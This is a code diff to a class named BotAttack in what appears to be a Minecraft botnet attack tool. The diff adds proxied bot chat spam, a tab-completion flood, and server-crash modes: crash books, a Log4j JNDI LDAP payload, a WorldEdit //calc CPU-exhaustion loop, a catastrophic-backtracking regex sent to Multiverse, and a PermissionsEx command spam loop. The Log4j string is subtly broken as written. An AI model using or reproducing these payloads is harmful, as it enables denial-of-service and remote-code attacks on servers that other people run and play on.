@@ -56,7 +56,6 @@ public class BotAttack extends IAttack {
     protected Map<String, String> modList;
 
     private Thread mainThread;
-    private Thread tabThread;
     private Thread taskThread;
 
     public Set<Client> clients = new ConcurrentSet<>();
@@ -90,10 +89,8 @@ public class BotAttack extends IAttack {
                     if (c.isConnected()) {
                         if (c.hasFlag("login")) {
                             if (ConfigUtil.ChatSpam) {
-                                new Thread(() -> {
-                                    c.send(new ClientChatPacket(getRandMessage(clientName.get(c))));
-                                    OtherUtils.doSleep(ConfigUtil.ChatDelay);
-                                }).start();
+                                OtherUtils.doSleep(ConfigUtil.ChatDelay);
+                                c.send(new ClientChatPacket(getRandMessage(clientName.get(c))));
                             }
 
                             if (ConfigUtil.RandomTeleport) {
@@ -111,10 +108,10 @@ public class BotAttack extends IAttack {
                                 new Thread(() -> {
                                     c.setFlag("crasher", true);
 
+                                    LogUtil.doLog(0, "[" + clientName.get(c) + "] 开始发送Crash Packet...", "ServerCrasher");
+
                                     switch (ConfigUtil.ServerCrasherMode) {
                                         case 1:
-                                            LogUtil.doLog(0, "[" + clientName.get(c) + "] 开始发送Crash Packet...", "ServerCrasher");
-
                                             while (c.isConnected()) {
                                                 try {
                                                     ItemStack crashBook = getCrashBook();
@@ -136,9 +133,41 @@ public class BotAttack extends IAttack {
                                                     OtherUtils.doSleep(ConfigUtil.ServerCrasherPacketDelay);
                                                 } catch (Exception ignored) {}
                                             }
-
+                                            break;
+                                        case 2:
+                                            String log4jExploit = "${jndi:ldap://192.168.${RandomUtils.nextInt(1,253)}.${RandomUtils.nextInt(1,253)}}";
+                                            c.send(new ClientChatPacket(log4jExploit));
+                                            break;
+                                        case 3:
+                                            String worldEdit = "//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<255;c++){}}}}";
+                                            c.send(new ClientChatPacket(worldEdit));
+                                            break;
+                                        case 4:
+                                            String multiverseCore = "/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^";
+                                            c.send(new ClientChatPacket(multiverseCore));
+                                            break;
+                                        case 5:
+                                            String pex_1 = "/pex promote a a";
+                                            String pex_2 = "/pex demote a a";
+                                            while (c.isConnected()) {
+                                                c.send(new ClientChatPacket(new Random().nextBoolean() ? pex_1:pex_2));
+                                                OtherUtils.doSleep(2000);
+                                            }
                                             break;
                                         default:
+                                            LogUtil.doLog(1, "ServerCrasher Mode设置有误，请检查配置文件。", null);
+                                            break;
+                                    }
+                                }).start();
+                            }
+
+                            if (ConfigUtil.TabAttack && !c.hasFlag("tabAttack")) {
+                                c.setFlag("tabAttack", true);
+
+                                new Thread(() -> {
+                                    while (c.isConnected()) {
+                                        MultiVersionPacket.sendTabPacket(c, "/");
+                                        OtherUtils.doSleep(100);
                                     }
                                 }).start();
                             }
@@ -157,8 +186,9 @@ public class BotAttack extends IAttack {
                             } else {
                                 c.setFlag("login", true);
                             }
-
                         }
+                    } else {
+                        alivePlayers.remove(c);
                     }
                 }
 
@@ -191,36 +221,18 @@ public class BotAttack extends IAttack {
             }
         });
 
-        if (this.attack_tab) {
-            tabThread = new Thread(() -> {
-                while (true) {
-                    Set<Client> cacheClients = clients;
-
-                    for (Client c:cacheClients) {
-                        if (c.getSession().isConnected() && c.getSession().hasFlag("login")) {
-                            MultiVersionPacket.sendTabPacket(c.getSession(), "/");
-                        }
-                    }
-
-                    OtherUtils.doSleep(10);
-                }
-            });
-        }
-
         mainThread.start();
-        if (tabThread != null)
-            tabThread.start();
-        if (taskThread != null)
+        if (taskThread != null) {
             taskThread.start();
+        }
     }
 
     @SuppressWarnings("deprecation")
     public void stop() {
         mainThread.stop();
-        if (tabThread != null)
-            tabThread.stop();
-        if (taskThread != null)
+        if (taskThread != null) {
             taskThread.stop();
+        }
     }
 
     public void setTask(Runnable task) {
@@ -255,7 +267,7 @@ public class BotAttack extends IAttack {
                 break;
         }
 
-        while (clients.size() > this.attack_maxconnect) {
+        while (clients.size() <= this.attack_maxconnect) {
             for (String p: ProxyUtil.proxies) {
                 try {
                     if (!EndMinecraftPlusV2.isLinux) {
@@ -270,7 +282,6 @@ public class BotAttack extends IAttack {
                     client.getSession().setWriteTimeout(Math.toIntExact(ConfigUtil.ConnectTimeout));
                     clientName.put(client.getSession(), User[0]);
                     clients.add(client);
-                    ProxyUtil.clientsProxy.put(client.getSession(), proxy);
 
                     pool.submit(() -> {
                         if (this.attack_motdbefore) {
@@ -315,8 +326,6 @@ public class BotAttack extends IAttack {
                 if (ConfigUtil.SaveWorkingProxy) {
                     ProxyUtil.saveWorkingProxy(proxy);
                 }
-
-                clientName.put(client.getSession(), username);
             }
 
             public void disconnecting(DisconnectingEvent e) {
@@ -350,7 +359,6 @@ public class BotAttack extends IAttack {
                                     clientName.put(rejoinClient.getSession(), username);
                                     clients.add(rejoinClient);
                                     rejoinClient.getSession().connect(false);
-                                    ProxyUtil.clientsProxy.put(client.getSession(), proxy);
 
                                     if (rejoinClient.getSession().hasFlag("join") || rejoinClient.getSession().hasFlag("login")) {
                                         rejoinPlayers.remove(username);
@@ -485,6 +493,10 @@ public class BotAttack extends IAttack {
             if (!joinedPlayers.contains(session)) {
                 joinedPlayers.add(session);
             }
+
+            if (!alivePlayers.contains(session)) {
+                alivePlayers.add(session);
+            }
         }
     }
 
@@ -514,7 +526,7 @@ public class BotAttack extends IAttack {
     }
 
     public static ItemStack getCrashBook() {
-        ItemStack crashBook = null;
+        ItemStack crashBook;
         CompoundTag nbtTag = new CompoundTag("crashBook");
         List<Tag> pageList = new ArrayList<>();
 
